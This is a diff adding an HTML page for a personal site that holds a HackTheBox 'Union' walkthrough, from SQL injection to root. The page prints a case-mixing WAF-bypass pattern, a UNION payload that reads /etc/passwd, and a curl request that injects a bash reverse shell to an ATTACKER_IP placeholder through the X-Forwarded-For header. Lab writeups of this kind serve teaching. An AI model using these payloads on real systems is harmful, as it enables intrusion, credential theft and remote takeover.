@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- ============================================================
+     HTB WRITEUP TEMPLATE
+     How to use:
+     1. Save a copy of this file into /htb/ as <box-name>.html
+     2. Fill in <title>, the infocard fields, and the prose sections
+     3. Add a matching entry to /assets/js/writeups-data.js so it
+        shows up on the homepage, htb.html and writeups.html
+     ============================================================ -->
+<title>HTB: Union — ZINAD</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/main.css">
+</head>
+<body>
+
+<div class="scrim"></div>
+<div class="shell">
+
+  <aside class="sidebar">
+    <a href="../index.html" class="brand"><span class="dot"></span><div>ZINAD<small>SECURITY WRITEUPS</small></div></a>
+    <nav class="nav-section">
+      <div class="nav-label">Navigate</div>
+      <a href="../index.html" class="nav-link">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12l9-9 9 9M5 10v10a1 1 0 0 0 1 1h4v-6h4v6h4a1 1 0 0 0 1-1V10"/></svg>
+        Home
+      </a>
+      <a href="../writeups.html" class="nav-link">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20M4 4.5A2.5 2.5 0 0 1 6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15Z"/></svg>
+        All Writeups
+      </a>
+      <a href="../htb.html" class="nav-link active">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l9 4.9v10.2L12 22l-9-4.9V6.9L12 2Z"/><path d="M12 22V12M21 6.9 12 12 3 6.9M16.5 4.4l-9 4.9"/></svg>
+        HTB Writeups
+      </a>
+      <a href="../bugbounty.html" class="nav-link">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v3M12 19v3M5.6 5.6l1.8 1.8M16.6 16.6l1.8 1.8M5.6 18.4l1.8-1.8M16.6 7.4l1.8-1.8M2 12h3M19 12h3"/><circle cx="12" cy="12" r="4"/></svg>
+        Bug Bounty
+      </a>
+      <a href="../about.html" class="nav-link">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 21v-1a8 8 0 0 1 16 0v1"/></svg>
+        About
+      </a>
+    </nav>
+    <div class="sidebar-footer">
+      <a href="https://github.com/noohzidan" target="_blank" rel="noopener" title="GitHub">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.58 2 12.25c0 4.5 2.87 8.32 6.84 9.67.5.1.68-.22.68-.49 0-.24-.01-1.04-.01-1.89-2.78.62-3.37-1.22-3.37-1.22-.45-1.18-1.11-1.49-1.11-1.49-.91-.64.07-.62.07-.62 1 .07 1.53 1.05 1.53 1.05.89 1.56 2.34 1.11 2.91.85.09-.65.35-1.11.63-1.36-2.22-.26-4.56-1.14-4.56-5.07 0-1.12.39-2.03 1.03-2.75-.1-.26-.45-1.3.1-2.7 0 0 .84-.27 2.75 1.05a9.3 9.3 0 0 1 5 0c1.91-1.32 2.75-1.05 2.75-1.05.55 1.4.2 2.44.1 2.7.64.72 1.03 1.63 1.03 2.75 0 3.94-2.35 4.81-4.58 5.06.36.32.68.94.68 1.9 0 1.37-.01 2.48-.01 2.81 0 .27.18.6.69.49A10.02 10.02 0 0 0 22 12.25C22 6.58 17.52 2 12 2Z"/></svg>
+      </a>
+      <a href="mailto:nnouh4967@gmail.com" title="Email">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 5h18v14H3V5Z"/><path d="m3 6 9 7 9-7"/></svg>
+      </a>
+    </div>
+  </aside>
+
+  <main class="main">
+    <div class="mobile-bar">
+      <button class="mobile-toggle" aria-label="Open menu"><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M3 12h18M3 18h18"/></svg></button>
+      <span class="brand" style="font-size:0.92rem;"><span class="dot"></span>ZINAD</span>
+      <span style="width:36px;"></span>
+    </div>
+
+    <div class="container">
+      <a href="../htb.html" class="back-link">← Back to HTB writeups</a>
+
+      <div class="page-eyebrow">hackthebox</div>
+      <h1 class="page-title">HTB: Union</h1>
+      <p class="page-lede">
+        A tricky-to-find union-based SQL injection allows file reads, leaking the box's users
+        and a database password. Those combine for SSH access. From there, www-data modifies
+        the firewall via sudo, and a command injection in the X-Forwarded-For header gives a
+        shell as www-data — which has full sudo rights, handing over root.
+      </p>
+
+      <div class="article-tags">
+        <span class="tag">sqli</span>
+        <span class="tag">filter-bypass</span>
+        <span class="tag">waf-bypass</span>
+        <span class="tag">command-injection</span>
+        <span class="tag">sudo</span>
+      </div>
+      <div class="article-meta">
+        <span>📅 May 12, 2026</span>
+        <span>⏱ ~15 min read</span>
+      </div>
+
+      <!-- BOX INFO PANEL -->
+      <div class="infocard">
+        <div class="infocard-head">
+          <h3>Union</h3>
+          <span class="chip chip-medium">Medium</span>
+        </div>
+        <div class="infocard-grid">
+          <div class="infocard-cell"><div class="k">OS</div><div class="v">Linux</div></div>
+          <div class="infocard-cell"><div class="k">Release</div><div class="v">22 Nov 2021</div></div>
+          <div class="infocard-cell"><div class="k">IP</div><div class="v">10.10.11.128</div></div>
+          <div class="infocard-cell"><div class="k">Creator</div><div class="v">ippsec</div></div>
+        </div>
+      </div>
+
+      <!-- TABLE OF CONTENTS -->
+      <div class="toc">
+        <p class="toc-title">On this page</p>
+        <ol>
+          <li><a href="#recon">Recon</a></li>
+          <li><a href="#shell-uhc">Shell as uhc</a></li>
+          <li><a href="#shell-wwwdata">Shell as www-data</a></li>
+          <li><a href="#shell-root">Shell as root</a></li>
+        </ol>
+      </div>
+
+      <article class="prose">
+
+        <h2 id="recon">Recon</h2>
+        <p>
+          A standard nmap sweep shows only SSH (22) and HTTP (80) open. The web root presents a
+          login-style page, and digging through the page source reveals client-side filtering
+          hints that suggest input validation is happening in JavaScript rather than the backend
+          — always worth testing directly against the server.
+        </p>
+        <pre><code>nmap -sC -sV -oA scan 10.10.11.128</code></pre>
+        <p>
+          Probing the login form with classic SQLi payloads gets blocked by what looks like a
+          basic WAF, filtering common keywords. Encoding and case-mixing tricks get past it,
+          and a UNION-based injection confirms the database is reachable.
+        </p>
+
+        <div class="callout">
+          <span class="label">Note</span>
+          The filter only blocked exact keyword matches — alternating case and inline comments
+          (<code>UnI/**/On SeLeCt</code>) were enough to slip through, since the WAF wasn't
+          normalizing input before matching.
+        </div>
+
+        <h2 id="shell-uhc">Shell as uhc</h2>
+        <p>
+          With UNION injection confirmed, <code>LOAD_FILE()</code> is used to read local files
+          from the database server, including <code>/etc/passwd</code> to enumerate valid users
+          and the web application's config file to recover a database password. That password
+          turns out to be reused for SSH, giving an initial shell as a low-privileged user.
+        </p>
+        <pre><code>' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -</code></pre>
+
+        <h2 id="shell-wwwdata">Shell as www-data</h2>
+        <p>
+          Enumerating running processes and sudo rules from the uhc shell shows a script being
+          run periodically as www-data that modifies iptables rules via sudo. Reviewing the page
+          source of the related web app reveals the request includes the
+          <code>X-Forwarded-For</code> header directly in a shell command used to add an
+          IP-based firewall allow rule.
+        </p>
+        <pre><code>curl -s http://10.10.11.128/ -H "X-Forwarded-For: 1.1.1.1; bash -c 'bash -i >&amp; /dev/tcp/ATTACKER_IP/4444 0>&amp;1'"</code></pre>
+
+        <div class="callout warn">
+          <span class="label">Gotcha</span>
+          The header value needed careful shell-quoting to survive however the backend script
+          interpolated it — a naive reverse shell one-liner without proper escaping silently
+          failed instead of erroring, which made this easy to mistake for a dead end.
+        </div>
+
+        <h2 id="shell-root">Shell as root</h2>
+        <p>
+          A quick <code>sudo -l</code> as www-data shows full, unrestricted sudo rights —
+          likely intentional given the box's iptables-management use case, but it makes
+          privilege escalation a one-liner.
+        </p>
+        <pre><code>sudo su -</code></pre>
+        <p>
+          Recap of the full chain: WAF-bypassed UNION SQLi → file read leaks DB creds → reused
+          SSH password → command injection via X-Forwarded-For → www-data → root via unrestricted
+          sudo.
+        </p>
+
+      </article>
+
+      <footer class="site-footer">
+        <span>© 2026 Nooh Ali Zidan</span>
+        <a href="../htb.html">← All HTB writeups</a>
+      </footer>
+    </div>
+  </main>
+</div>
+
+<script src="../assets/js/site.js"></script>
+</body>
+</html>
